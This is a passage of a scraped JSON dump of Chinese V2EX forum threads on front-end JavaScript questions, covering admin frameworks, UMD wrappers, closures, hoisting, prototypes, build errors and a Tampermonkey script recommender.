adminlte", " 建议很中肯", "那我来说个 polymer...", " 感谢推荐，我是 vue-admin 的作者，有问题可以找我，现在文档还缺失，会找个时间补补。", "没人推荐 rails-admin 吗？基本都不用写代码的😂", "上 vueJS 就可以了，没别的推荐。", "咦，咋没人说 ExtJS?", " 对，功能才是最重要的。", "上面的回复让我深刻的体会到了前端的的选择之多。。。", "纯后台模板的话， Metronic ，这个好像还没人推荐？\r", "理由：界面美观，价格不贵，支持 AngularJS 。", "楼上的各位， Vuejs 已经 2.0 了，准备好重构了么？", "随便用搜索一下 angular admin  或 angular2 admin ，开源的项目一大堆。  你搜索 react admin 或 vuejs admin  结果就几条。 \r", "\r", "还有即使同样的项目 用 angular1 重构也可以做的很好， 很多 angular1 的项目完全是不会用 angular 导致的，估计楼主的项目也是 angular 的控制器里面全是 jQuery 的代码", "感谢大家的建议，我总结了一些：\r", "\r", " - 1  AngularJs\r", "理由： 重构后学习成本减少，而且可以考虑用 ng2 新特性来写\r", "\r", "- 2 VueJs\r", "理由: 齐全的中文文档和社区，方便开发和快速解决问题\r", "\r", " - 3 React\r", "理由: 公司现有 APP 开发选择是 React-Native,目前公司这边可能会考虑成本问题让我们用 React 来写\r", "\r", "4. ExtJS\r", "5. 其他\r", "\r", "总结: 目前大家推荐的一些技术选择，我都去看看了解下。因为我本人是做 PHP 后端开发对 js 不是很了解，然后还需要和主管讨论下，看看最后的技术选择。\r", "\r", "感谢大家回答。", "不怕大家说，本人目前后台还是习惯用 bootstrap!"]},
{"content": ["<div class=\"topic_content\">我想问下我们现在在做一个外包项目，模板是买的，然后我是用的 bootstrap 写的页面，所有的 tab 切换都是一个页面上，然后模板是分开的，重新加载的一个页面，我们后台说，我这样写他没有办法传递参数，没办法套用模板，我想问下是否有解决的办法，比如说可以用什么方法，给所有的 tab-pane 加上一个能识别的地址，或者后台能有什么办法直接将这个页面上加载他的模板，然后用上模板的控制器么，他说的所有的控制器都是分开写的。</div>"], "reply": "13", "tittle": "一个 bootstrap tab 切换的问题", "comment": ["tab 切换是否需要刷新页面（重新加载）？", "$('a[data-toggle=\"tab\"]').on('show', function (e) {\r", "//ajax 请求返回对应模板页，然后显示在 tab 的 ontent 中\r", "}）", "上个页面看看，没页面怎么知道怎么搞？", "ajax 加载局部，怎么不可以传递参数啊，你们后台是不是傻啊。", "估计这个后端，不懂 js 。", "内嵌 iframe", " 这个只是刷新页面的一部分，比如你点击了其中的一个 tab 链接，会在本页面加载出相应的 tab 内容，它的结构是 <a href=“#id ”  data-toggle=\"tab\"></a> 对应的内容是：<div class=\"tab-pane \" id=\"id\">这样的结构，所以他只是刷新当前页面的一部分，不是刷新全部页面。", " 那我就不知道了，我说用 ajax 能解决，他说不行，只能读取数据，但是不能加载控制器。不能执行其他操作。", " 我有跟他提到过这个，但是他就认定了，别人的模板全是分页写出来的，就是一个分类是一个全新的页面，他无法去套取。", "   我用过，但是他过来看了下说不行。我也没什么办法了，现在我只能把页面全部分出来写了，我操 40 多个页面。", "  让 lframe 指向你要加载的页面不行么？ 还不如试试在前端来渲染 DOM", "  第二次我就是用的 iframe 加载的啊，他说不行的嘛，这是我第三次修改页面了，想想也是醉了。", "要不用 js 来渲染页面？后端只提供数据"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>假设有一个这样的构造函数，但是只能得到他的参数个数是不确定的，参数为数组形式 [3,4,5,..], 然后希望实例化出一个对象</p>\n<pre><code>var arr = [3,4,5..]\nfunction f(a,b..) {\n  this.a = a\n  this.b = b\n  ...\n}\n</code></pre>\n<p>我所知道的方法有两种 <code>new f(...arr)</code> 和 <code>Reflect.construct(f, arr)</code>，<br>\n但是我还想知道有没有用 apply 相关解决的方法？</p>\n</div></div>"], "reply": "4", "tittle": "一个实例化的问题", "comment": ["或许是 ECMA1 兼容的 Reflect.construct 版本\r", "function contract(f, arr)\r", "    var x = {}\r", "    x.__proto__ = f.prototype\r", "    f.apply(x, arr)\r", "    return x\r", "}", "var f = function(){\r", "for(var i=0;i<arguments.length;i++){\r", "this[String.fromCharCode(97+i)]=arguments[i]\r", "};\r", "};\r", "\r", "new f(1,3,4); // Object {a: 1, b: 3, c: 4}", "new (f.bind.apply(f, [1].concat(arr)))();\r", "大概这样\r", "PS ，在没有 bind 的时代人们是这样用的: \r", "function g(){};\r", "g.prototype=f.prototype;\r", "f.apply(new g(),arr);\r", "但是后来有了 new.target 和 class ，第二种方法不好用了\r", "如果你用 babel 把 new f(...arr);转成 ES5 的话你会发现用的是第一种方法，只是多个 helper 函数来确保 arr 是个数组而不是什么奇怪的东西\r", "PPS ，__proto__是浏览器厂商自己搞出来的，说它 ECMA1 兼容的还是要学习一个(逃", " 赞，正是我想要的， 一楼的解法就是你说的第二种方法吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://imququ.com/\" rel=\"nofollow\">https://imququ.com/</a></p>\n<p>最近研究的很多东西，这个人都有比较细致的讲解</p>\n</div></div>"], "reply": "20", "tittle": "感觉这个屈屈挺吊啊", "comment": ["这个博客在 v2 曝光率挺高的，速度很快，内容也不错。", "真大牛，文章既有广度又有深度。关键是还经常更。\r", "\r", "web 新技术的“教科书”了。", "谢谢告知，收藏关注啦√", "360 的一个组负责人，你想想屌不屌", "看过不少文章，的确不错。\r", "至少他把每篇文章当作一个产品认真对待，不像我。。。。。。。", "冒个泡。\r", "\r", "如果要跟我交流，我的博客关于页有 gmail 邮箱和 telegram 。\r", "v2 是公共场合，你发这种没实质内容的帖子会打扰 v 友啊。。。", " 是不是有人给你请水军了哈哈哈哈哈哈", " 你可能得给楼主付下广告费", " 感谢提供这么多有用的文章", "https 的那篇文章很详细", "之前看过 他的博客, 收益良多", "只要一说这个站，此帖必火！", " 无形装逼 最为致命 哈哈", " 速度相当 6 啊，我这打开速度在 100ms 以内，怎么做到的，可以分享一下吗", "早就收藏了这个博客\r", "好多有用的东西", " 但是 360 的产品似乎都没有普及 https 和 http2 哦", " \r", "只要服务端足够快，页面小，头部没有外链资源，服务器在国内，一般都慢不到哪儿去的。\r", "还有就是如果要使用 HTTPS ，有一些优化点需要额外注意下，例如启用 HTTP/2 。", "这博客应该是我浏览过的网站里加载最快的一个。", " \r", "\r", "一般大公司开发和运维是分开的，开发可能会各种折腾新技术，但是运维需要保证系统可维护性及稳定性。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在浏览器中, deviceorientation 返回的 event.alpha 、 event.beta 及 event.gamma 表示设备坐标系上的旋角,但是这个怎样可以识别到手机在竖起手机时的左右旋转呢?</p>\n</div></div>"], "reply": "1", "tittle": "浏览器中 的 deviceorientation 事件中,怎样可以识别到设备在竖起手机时,判断出手机是左旋还是右旋呢?", "comment": ["其实这是一个线性代数的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为一个前端小白，周末开始试着写下坑爹的微信小程序，想用 ES7 来写，避免 callback hell 。</p>\n<p>开始尝试用 babel 编译，然后发现没有 runtime ，需要 babel-polyfill 。于是用 babel-runtime-transform-runtime 来添加 async 和 generator 的转换。结果发现这货转换后在源码里就添加了俩 require 。由于微信小程序的 require 不支持 npm ，我又尝试用 webpack 来把他们打包在一起。最后又遇到了坑爹的 polyfill 里用到了大量微信小程序里没有的东西，比如 global 什么的。</p>\n<p>看了些 github 上的轮子，大体是把缺的东西自己造一套，或者改下 babel 源码。感觉还是不太优雅，不知道各位前端菊苣有啥黑科技能解决这个问题。<br>\n因为不是太熟前端，各种搜也只想到了这些方案，都不是太如意。<br>\n还请赐教</p>\n<p>（微信的朋友就不能让你们家 require 支持下搜索路径吗，只能用相对路径来写太不“工程化”了</p>\n</div></div>"], "reply": "22", "tittle": "求问如何优雅的在微信小程序里使用 ES7？", "comment": ["楼主可以试下 Promise ，不一定要用 async/await 。参考：\r", "避免 callback hell ，用 promise 已经可以了。", "ts 上 babel 太乱。。", "promise 太丑， async/await 大法好", " 微信小程序里也是没 promise 的 需要 babel 添加\r", "promise 肯定用 只是 es7 的 async 比起 es6 还要用 co 好太多", " 参考的帖子评论里有写引入 Bluebird 的方式。\r", "我记得有人写过把 async/await 转换成 Promise 调用的 Babel 插件，不知道为什么官方没提。", "怪不得人们说最喜欢折腾的就是前端。", " 这次是刚需就别强行黑了吧。", "微信小程序官方文档里说要自行引入 polyfill\r", "我当时就懵逼了 这要怎么引入咧", " 语法层面的转换不需要 babel-polyfill ，单独引入 Bluebird 作 Promise 库就行。方法见链接评论。", "ES7 和 ES2017 ，大家好像搞混了\r", "\r", "ES7 是 ES2016 ，没有 async function\r", " es7/es2016 有 async 啊 \r", "我就是用 babel es2016 编译的  node 可用\r", "  \r", "刚看了下 原来 async 最后没来的及进 es7 最终版\r", "不过各种轮子已经默认把 async 塞进了 es7 里 用还是能用", "大声说出前端回调超过两层的场景", "微信小程序本身就小程序 你还要构建那么深的逻辑 该电一下了\r", "没有用户 跑在沙河里 不能做全家桶 一个纯展示 点点填填表的东西 至于那么复杂么", "现在做下来，微信小程序最大的障碍就是大小只有 1M 。", " 然后现在 async 还是返回 promise.", "前端小应用完全不用担心 callback 。 不会那么深的", " 工具爱怎么处理怎么处理，只要源码里别用 promise 就可以 ^^", "关于前端为了用一个新语言特性在开发环境引入几十个依赖并且造了一个轮子的故事", " @", " \r", "还是很容易深吧\r", "比如先登录再定位然后发起个网络请求最后等用户一个操作\r", "一套下来就爆炸了  \r", "\r", "总觉得要不我还是用 rx 吧   移动端一直用 rxjava 和 rxswift 也是蛮顺的", "\r", "完全解决 ES7 以及外部 NPM 包的问题。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>嗯...首先对于这个标题表示抱歉 :)</p>\n<p>感觉有点标题党了，但是最初写这篇文章的目的也是为了让不懂的初学者能一下子看懂这三个东西的区别，而不是在长篇大论中退缩</p>\n<p>这篇文章中的内容来自我的个人理解和 MDN 文档，如果有任何错误欢迎指出</p>\n</blockquote>\n<hr>\n<p>对于初学者来说， Prototype 似乎还好理解一些，但是在进行更深入的学习研究之后或许会有点晕，一些文章中 <code>obj.prototype</code> 和 <code>obj.[[prototype]]</code> 中的两种写法区别在哪？分别指的是什么？还有 <code>__proto__</code>  呢？</p>\n<h2>一句话解释:</h2>\n<p><strong>obj.prototype 中的 prototype:</strong> 是指类型 (Type) 上的原型对象 (Prototype object)</p>\n<p><strong>obj.[[prototype]] 中的 [[prototype]]:</strong> 是指实例 (Instance) 中指向创建这个实例的类型上的原型对象的 \"链接\"</p>\n<p><strong>obj.<code>__proto__</code>:</strong> 这个属性实际和上面的 [[prototype]] 是同样的东西，在过去被各大浏览器作为非标准属性实现</p>\n<h2>In Depth ：</h2>\n<p>其实你应该已经猜到了，<code>[[prototype]]</code> 并不是一个真正存在于 <code>obj</code> 或是它的原型链上的一个属性，它存在于 JavaScript 引擎的内部，这样写是为了区分类型上的 <code>prototype</code> 属性和这个实例上的\"链接\"属性。</p>\n<p>在实例上获取原型对象的正确的方式是使用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf\" rel=\"nofollow\"><code>Object.getProtoTypeOf()</code></a> 这个在 ECMAScript 5.1 及以后版本的实现中可用，根据 MDN 提供的资料，兼容的浏览器版本为 Chrome 5+, Firefox 3.5+ , Internet Explorer 9+, Safari 5+</p>\n<p>而 <code>__proto__</code> 是一个非标准的属性，由于广泛的支持和使用在 ECMAScript 2015 中被纳入标准，但是这只是作为兼容性考虑，建议使用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf\" rel=\"nofollow\"><code>Object.getPrototypeOf()</code></a> 代替</p>\n<p>一般像 <code>__proto__</code> 这样以两个下划线开始的写法为私有属性或私有方法，类似于 CSS 中横线开头为私有前缀</p>\n<h2>提示:</h2>\n<p>如果你对性能比较敏感， MDN 文档建议不要更改对象的 [[prototype]] 属性，即使用 <code>obj.__proto__ = xxx</code> 或 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf\" rel=\"nofollow\"><code>Object.setPrototypeOf()</code></a> 来修改对象的 [[prototype]]，这在所有 JavaScript ，因为这会导致一些内部优化失效，造成的性能影响不仅是对于修改 [[prototype]] 的过程，甚至包括任何对于这个修改过的对象的访问。</p>\n<p>解决方案是使用 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create\" rel=\"nofollow\"><code>Object.Create()</code></a> 来创建一个新的对象并设置将要设置为原型对象的对象传入参数中。</p>\n<h2>其他</h2>\n<p>这篇文章来自我的博客 &gt; <a href=\"https://aka.mn/2016/10/31/difference-in-prototype-and-proto/\" rel=\"nofollow\">https://aka.mn/2016/10/31/difference-in-prototype-and-proto/</a></p>\n<p>为了避免赚点击量的嫌疑，作为全文发布，文章中如果有任何错误欢迎指出</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "一句话看懂 Prototype, [[Prototype]], __proto__的区别", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 react ，打算用 gulp 和 browserify 搭建一个环境，新建了一个任务,目的是把 es6 语法的 jsx 转化成 es5 的 js 结果一直报错，请问一下是什么原因呢？\n<img alt=\"CSDN 图标\" src=\"http://ocg5h4y2o.bkt.clouddn.com/error.png\" title=\"报错截图\"></p>\n<p>这是 gulpfile.js 里的代码</p>\n<pre><code>gulp.task('jsx', function() {\n\tbrowserify('src/main.js')\n\t\t.transform(babelify, {\n\t\t\tpresets: ['es2015', 'react']\n\t\t})\n\t\t.bundle()\n\t\t.pipe(source('bundle.js'))\n\t\t.pipe(gulp.dest('js'));\n});\n</code></pre>\n<p>忘了选节点了。。。结果修改时间已经过了，重新发一下</p>\n</div></div>"], "reply": "2", "tittle": "gulp 执行 task 报错", "comment": ["看上去 好像是 babel 的转译插件没有装，试试 \r", "npm install babel-preset-es2015 --save-dev\r", "npm install babel-preset-react --save-dev", " 应该是插件没装好，我之前是用 npm 下载的，加上网络不行，估计中间出了什么差错，现在用 cnpm 重新下了一下就可以了。"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://md5file.com/calculator\" rel=\"nofollow\">https://md5file.com/calculator</a>\r<br>\r<br>在线取文件 sha1 没问题，任意大小都可以算出来，而且速度超级快。\r<br>\r<br>弄回页面保存 HTML 本地调用（已修改源码路径），测试一些小文件几百 MB 也可以算出来，但测试大于 600MB 以上的就不会执行了。\r<br>\r<br>懂 js 的帮忙看下这个怎么保存本地是不是还要改什么？\r<br>谢谢！</div>"], "reply": "4", "tittle": "在线通过 JS 取文件 SHA1", "comment": [" 帮忙看看这个快速取大文件的。", " 另存不就好了吗？", " 就是另存本地，然后测试出现 BUG 。只要文件大于 600MB 这样以上的就不能取了。其他倒是都正常。麻烦你看下。因为这个取大文件速度确实好快，刚好又是需要大文件。", "另存之后，下载必要的 js 放在目录，放在 http 下运行，不要直接双击用 file:///"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近尝试研究某 jquery 插件，但是最外层的封装代码看不明白。搜索出来的文章都是各有各说，很难让我从整体上了解整段代码。请教下怎么理解下面这段代码：</p>\n<pre><code>01    (function(root, factory) {\n02        if (typeof define === 'function' &amp;&amp; define.amd) {\n03            define('jqname', ['jquery'], factory);\n04        } else if (typeof exports === 'object') {\n05            module.exports = factory(require('jquery'));\n06        } else {\n07            factory(root.jQuery);\n08        }\n09    }(this, function($) {\n10        /* code1 */\n11    }));\n</code></pre>\n<p>一、 root 我知道是 Window 对象，那请问 01 行的 factory 对应什么对象？ console 输出来是整个 /* code1 */ 的部分，网上一搜 \"factory\" 都是讲工厂模式的，看后对应题目的代码还是想不明白。<br><br>\n二、我知道下面这种 IIFE 写法</p><pre><code>(function(){ /* code2 */ }());\n(function(){ /* code2 */ })();</code></pre>\n但是把题目的代码简化后如下<p></p>\n<pre><code>(function(par1, par2) {\n    /* code3 */\n}(par3, par4));</code></pre>\n<p>那样写的话，后面的 (par3, par4) 就不是分组操作符了吧？那整段题目为什么要那样写、作用又是什么呢？\n三、请问 01 行的两个参数是 \"谁\" 传进去的？（或者说匿名函数的参数是怎么传进去的？立即执行时函数段从哪里获取参数呢？）<br><br>\n四、 02 至 08 行我的理解是，检测网页的 Javascript 是使用何种规范。如果是 AMD ，必然会已声明 define 全局变量，然后 03 行会执行模块加载代码；如果是 CMD ，就会执行 05 行来加载模块。这样理解正确吗？<br><br>\n五、 05 行的 factory(require('jquery')) 看不懂<br><br>\n六、 07 行的 factory(root.jQuery) 看不懂<br><br>\n七、 09 行的 this 是指 Window 对象吗？<br><br>\n问题有点多，请赐教。</p>\n</div></div>"], "reply": "9", "tittle": "如何理解以下这段 Javascript 封装代码？", "comment": ["UMD 封装，可以支持全局方式加载，以及  AMD 和 CMD 方式加载\r", "factory 就是\r", "\r", "```\r", "function($) {\r", "  /* code1 */\r", "}\r", "```\r", "\r", "这个匿名函数", "前 3 个问题：\r", "这段代码\r", "(function(par1, par2) {\r", "    /* code3 */\r", "}(par3, par4));\r", "写成这种形式你就明白了\r", "function xxx(par1,par2){\r", ".......\r", "}\r", "xxx(par3, par4);", "> \r", "五、 05 行的 factory(require('jquery')) 看不懂\r", "\r", "这个是将 jquery 模块化使用支持。\r", "\r", "我是参考 Node.js 模块化想的，我想应该不会错的。", "umd,同时适应 amd 和 cjs", "简单的说下吧，第九、十行是一个包裹函数，期待一个 jq 对象，用来拓展$.fn\r", "第三、五行分别是不同的封装用来获取 jQuery 对象，并注入到 factory 中，也就是前面的包裹函数。\r", "第七行是直接从全局拿 jQuery ，然后注入。\r", "至于第五行的 module.exports 和 require 你去了解一下 AMD/UMD 的写法就清楚了", "你找个好点的编辑器看清楚代码块开合，首先是匿名函数立即调用的问题，整个代码块大概是这样的形式\r", "(function(root, factory) {\r", "  /* 模块导入的逻辑 */\r", "} (this, function($) { /* 模块的实际逻辑 */ }));\r", "\r", "这里使用 IIFE 将 this 作为实参传进去作为 root ， function($) { /* code1 */ } 这个函数传进去作为 factory （所以你 console 才会输入 code1 ），这个 factory 才是整个插件的实际逻辑。\r", "\r", "至于模块导入，也就是那串 if ... else if ... else 的逻辑，分别对应 amd 、 commonjs 和 window 全局的三种格式，最终都是把 function($) { /* code1 */ } 导出成模块。", "补充一下， function($) { /* code1 */ } 里要传进$，明显是 jQuery 了， amd 、 commonjs 和 window 全局三种规范导入 jQuery 模块的方式也并不相同，因此\r", "if (typeof define === 'function' && define.amd) {\r", "  define('jqname', ['jquery'], factory);\r", "} else if (typeof exports === 'object') {\r", "  module.exports = factory(require('jquery'));\r", "} else {\r", "  factory(root.jQuery)\r", "}\r", "这一段的大概逻辑是\r", "if 是 amd 模块规范（ define 是个函数），使用 amd 模块规范将 jQuery 传给 function($) { /* code1 */ } \r", "else if 是 commonjs 规范（ exports 是个已定义的 object ），使用 commonjs 规范将 jQuery 传给 function($) { /* code1 */ } \r", "else 没有模块规范，直接找 window.jQuery 传进去。", "楼上回答地非常详细 \r", "补充一句 \"从整体上了解整段代码\" --> 这段代码的服务对象是你. 让你在任何地方都能使用这个 module. 包括你最终在浏览器里运行的产品以及你的测试代码\r", "ref: "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>function makeIterator(array) {\n  var nextIndex = 0;\n  return {\n    next: function() {\n      return nextIndex &lt; array.length ?\n        {value: array[nextIndex++], done: false} :\n        {value: undefined, done: true};\n    }\n  };\n}\nvar it = makeIterator(['a', 'b']);\n\nit.next() // { value: \"a\", done: false }\nit.next() // { value: \"b\", done: false }\nit.next() // { value: undefined, done: true }\n</code></pre>\n<p>这段代码的功能是创建一个迭代器，但是有一点我想不通。\nvar it = makeIterator(['a', 'b']);\n执行完这条语句之后， it 是一个对象，对象里面有一个 next 方法</p>\n<pre><code>{\n\tnext: function () {\n   \t\treturn nextIndex &lt; array.length ?\n        \t{value: array[nextIndex++], done: false} :\n        \t{value: undefined, done: true};\n\t}\n}\n</code></pre>\n<p>然后当执行 it.next()的时候，为什么这个方法可以访问 nextIndex 和 array 这两个值？按我的理解执行函数的时候只有通过参数才能传值，应该这样使用 it.next(nextIndex,array)才能执行函数才对？\n我是一个 C 程序员，最近在学习 Javascript 。</p>\n</div></div>"], "reply": "7", "tittle": "请教一段 javascript 代码答疑", "comment": ["执行 it.next()  返回一个对象啊  对象不是有 value 和 done 么", "额  上面看错了。。。关键词 闭包", "没写过 JS ，不过 LZ 可以类比 Java 迭代器实现，感觉原理差不多，可以看看这边博文 ", "这就是闭包呀！\r", "每一次调用 makeIterator ，变量 nextIndex 和 array 都会被分配在一个封闭的空间里，这个空间只有在 makeIterator 函数内部可见，并且此空间关联在当前调用的上下文中。\r", "综上，最后的效果就是：每一次执行都会形成一个私有的上下文链，链可以自底向上层层访问，而不可以倒过来。\r", "说白了就是变量私有化，有点多态的感觉。\r", "个人浅见，仅供参考！", "看看 sicp ", "查了闭包相关的知识，已经解决疑问，谢谢各位。", "c 语法里有个 block ，跟那个类似。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用原生自带的 tts 功能实现了一个语音合成的组件，可将输入文本直接转换成语音在 app 中播放，支持 ios 和 Android 。</p>\n<p>欢迎大家围观 star 。\ngithub 地址： <a href=\"https://github.com/somonus/react-native-speech\" rel=\"nofollow\">https://github.com/somonus/react-native-speech</a></p>\n<p>另外最近还封装了一个 react-native-router ，使用方式和 react-router 类似。 <a href=\"https://github.com/somonus/react-native-route\" rel=\"nofollow\">https://github.com/somonus/react-native-route</a></p>\n<p>以及 react-native 版本的 echarts ： <a href=\"https://github.com/somonus/react-native-echarts\" rel=\"nofollow\">https://github.com/somonus/react-native-echarts</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "封装了一个 react-native 语音合成组件", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>'''javascript\nbtn.onclick = test;</p>\n<pre><code>  var test = function() {\n    // displayMessage('Your inbox is almost full — delete some mails', 'warning');\n    displayMessage('Brian: Hi there, how are you today?','chat');\n    displayMessage('Brian: Hi there, how are you today?');\n  }\n  \n   function displayMessage(msgText, msgType){\n      ......\n  }\n</code></pre>\n<p>'''</p>\n<p>Because vareiable declarations(and declarations in general) are processed before any code is executed, declaring a variable anywhere in the code is equivalent to declaring it at the top.\n这是 MDN 上面的原话。。但是把 btn.onclick = test;挪到 test 变量定义的下面就正确了。这是为什么？？？\n还有一点： btn.onclick=functionName;这是对的\n但是 btn.onclick=anonymousFunctionName{}就是错的。必须要加上括号。。\n但是\nThe parentheses in this context are sometimes called the \"function invocation operator\"\n这也是 MDN 上面的原话。这又是为什么？？？？</p>\n</div></div>"], "reply": "4", "tittle": "新手求助 ——关于 javascript var hoisting 和 function 的问题！", "comment": ["declaration 是指 声明，不是定义。声明会提升到前面。也就是说你的代码相当于：\r", "\r", "var test\r", "onclick = test // 此时值为 undefined\r", "test = function(){}", "btn.onclick=anonymousFunctionName{} 这根本就不符合语法吧？{}是什么？\r", "你要是定义了匿名函数，比如\r", "var anonymousFunctionName = function(){}\r", "btn.onclick = anonymousFunctionName\r", "这肯定是可以的。那句英文是说如果你\r", "var anonymousFunctionName = function(){}\r", "btn.onclick = anonymousFunctionName()\r", "就不对了，因为你是调用了函数获得了返回值，而不是把函数本身传给了 onclick 。", "变量的声明会上提，并不是变量的赋值会上提，这是 2 个过程\r", "\r", "所以当你执行 btn.onclick = test 的时候， test 处于“已经声明，未赋值”的状态，即 undefined", "关键词：函数声明 && 函数表达式 && 匿名函数"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从 技术人员招聘难度，学习曲线，开发效率 等等来看的话如何呢</p>\n</div></div>"], "reply": "12", "tittle": "ExtJS 是否已经过时？", "comment": ["我觉得在传统行业里， CRUD 的界面还没人能超过 EXTJS 的，但这些行业里的机会的确是少，该做的都做了，不做的都死了。", "太土了，越看越丑。。。", "····宁可用 bootstrup+各种基于他和 jquery 的各种控件。。。要么直接上 react 或者 vue 等（ PS ：不喜欢这些，太复杂了）", "extJs 太复杂，而且丑，而且定制型感觉不友好，好像兼容性 BUG 也不少", "七八年前用过，不知道现在发展怎么样了。\r", "\r", "复杂、功能强大，适合做政府、企业后台各种数据操作、展示。\r", "\r", "前期学习成本高，定制困难。", "12 年用它撸过一个后台管理，然后抛弃了。。\r", "不过那个项目我还在维护。。", "泪目", "有点吧", "生成大量垃圾 html 表格代码 看的直恶心 一般是做传统的后台管理系统会用吧 兼容性好  学习成本高 快赶上 mvvm 难度了 刚进公司时就想让我维护一个 ext 项目 结果被我用 avalonJs 重构了 宁愿学 mvvm 也不学这玩意", "是", "ExtJS 楼上部分群众各种唾弃，但在传统行业替代品真的不多。\r", "\r", "纯 ExtJS 代码门槛略高，而且灵活度不高。对于一些定制化的需求没法使用纯粹的 ExtJS 进行开发。\r", "所以我们现在的用法是 ExtJS 与 easyui 并用\r", "由 ExtJS 提供组件库（用作 UI ，这 UI 有人说难看，但对于某些传统行业来说那个蓝色基调的 UI 是效率最高的选择）\r", "easyui 提供灵活性与可维护性更优的表格组件\r", "\r", "PS. 时髦的技术有时候并不适合用于某些领域，记得看需求选型。", "传统企业的后台管理不都是用 easyui 和 extjs ？不过如果是要学习的我觉得上 mvvm 也不错啊。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>Show Site All UserJS | 显示当前网站所有可用的 UserJS 脚本</h2>\n<p>该脚本的功能是：当你浏览网页的时候，自动为你推荐适用于当前页面的<code>UserJS</code>(Tampermonkey)脚本，并可以一键安装。</p>\n<h2>附加说明</h2>\n<p>1.适用于当前页面的<code>UserJS</code>脚本最多推荐 50 条</p>\n<p>2.脚本按照分数由高到低排序</p>\n<p>3.本插件的提示框在无人操作的时候会在 10 秒后自动消失</p>\n<p>4.点击本插件提示框的右上角的叉叉关闭按钮后，当前网站的<code>本次会话</code>的所有页面都将不会再出现本插件的提示框</p>\n<p>5.展开本插件提示框后，鼠标<code>悬停</code>到任意列表的脚本标题上面可以查看到该脚本的<code>说明</code></p>\n<p>6.点击<code>脚本标题</code>可以跳转到脚本主页</p>\n<p>7.点击<code>安装</code>,可快捷安装该脚本</p>\n<p>8.交流 QQ 群:104267383</p>\n<h2>截图</h2>\n<p><img alt=\"\" src=\"http://ww4.sinaimg.cn/large/7de3675bgw1f9dslnvx6mj20tu0dignb.jpg\"></p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/7de3675bgw1f9dslx2puij20vt0ki110.jpg\"></p>\n<p><img alt=\"\" src=\"http://ww1.sinaimg.cn/large/7de3675bgw1f9dsm57th4j20u30iaagx.jpg\"></p>\n</div></div>"], "reply": "12", "tittle": "[Tampermonkey 脚本]显示当前网站所有可用的 UserJS 脚本", "comment": ["忘记附加安装地址了，下面附加上:\r", "\r", "## 获取脚本\r", "\r", "-项目地址:", "\r", "\r", "-greasyfork 地址:https://greasyfork.org/zh-CN/scripts/24508-show-site-all-userjs-%E6%98%BE%E7%A4%BA%E5%BD%93%E5%89%8D%E7%BD%91%E7%AB%99%E6%89%80%E6%9C%89%E5%8F%AF%E7%94%A8%E7%9A%84userjs%E8%84%9A%E6%9C%AC-jaeger\r", "\r", "-直接安装地址:", "/raw/show-site-all-userjs.user.js", "感谢好东西!", "这个 6, 这些脚本是从哪里采集的呢?", "Mark", "\r", "挺好的，但是就是有点儿丑了", " 求帮忙美化", "已用。可以的", "已安装的脚本应该不再显示，或标记出来。", "不错，多谢分享！", "赞，很好", "最好不要只按评分，发布 /更新日期也应该有所考量，有些分高的实际上很老已经不能用了", " 看了下源码，是从 ", " 获取脚本列表的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>js 的代码如下</p>\n<pre><code>var g = new JSEncrypt();\ng.setPublicKey(f.key);\nc = g.encrypt(f.hash + c);\n</code></pre>\n<p>我知道 f.key 和 f.hash 的值， c 是密码的原文，怎么用 python 实现这个过程？<br>\nf 的格式如下</p>\n<pre><code>{'hash': '17aa7f5df0ae61b8', 'key': '-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCdScM09sZJqFPX7bvmB2y6i08J\\nbHsa0v4THafPbJN9NoaZ9Djz1LmeLkVlmWx1DwgHVW+K7LVWT5FV3johacVRuV98\\n37+RNntEK6SE82MPcl7fA++dmW2cLlAjsIIkrX+aIvvSGCuUfcWpWFy3YVDqhuHr\\nNDjdNcaefJIQHMW+sQIDAQAB\\n-----END PUBLIC KEY-----\\n'}\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "怎么用 python 模拟 js 里 JSEncrypt 模块的加密方式？", "comment": ["这个是 GPG 吧", " 这个是 B 站登录加密密码的一段 js 。", " 看上去像 GPG", "RSA 加密吧", "去代码里面搜加密方法。。", "\r", "\r", "直接调 openssl 啊……", "pycrypt", "或者调用 pyv8 去跑也行......装环境有点恶心", " 这个在算法细节上和 JSEncrypt 一致吗？", "用 nodejs 做个接口调用", " 等于把程序运行了一次，当然一致"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>'''javascript\nbtn.onclick = test;</p>\n<pre><code>  var test = function() {\n    // displayMessage('Your inbox is almost full — delete some mails', 'warning');\n    displayMessage('Brian: Hi there, how are you today?','chat');\n    displayMessage('Brian: Hi there, how are you today?');\n  }\n  \n   function displayMessage(msgText, msgType){\n      ......\n  }\n</code></pre>\n<p>'''</p>\n<p>Because vareiable declarations(and declarations in general) are processed before any code is executed, declaring a variable anywhere in the code is equivalent to declaring it at the top.\n这是 MDN 上面的原话。。但是把 btn.onclick = test;挪到 test 